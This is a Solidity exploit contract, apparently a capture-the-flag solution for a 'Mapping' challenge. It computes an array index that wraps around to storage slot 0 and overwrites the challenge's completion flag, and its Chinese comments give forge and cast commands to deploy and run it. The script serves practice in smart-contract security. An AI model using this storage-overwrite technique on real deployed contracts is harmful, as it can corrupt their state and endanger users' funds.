// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "forge-std/console.sol";
import "../src/Mapping.sol";

//部署: forge create script/Mapping.s.sol:MappingHack --rpc-url $RPC --private-key=$PRIVATE_KEY
//调用: cast send 0x23f8D6E2711c50B3EFc0D00198Cb22013738eeA4 "exploit()" --rpc-url $RPC --private-key $PRIVATE_KEY
//查看: cast call 0x23f8D6E2711c50B3EFc0D00198Cb22013738eeA4 "getStatus()(bool)" --rpc-url $RPC
contract MappingHack {

    MappingChallenge public m;

    function exploit () external{

        m = new MappingChallenge();

        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        m.set(index, 1);
        console.log("isComplete", m.isComplete());
    }

    function getStatus() external view returns(bool){
        return m.isComplete();
    }
} 

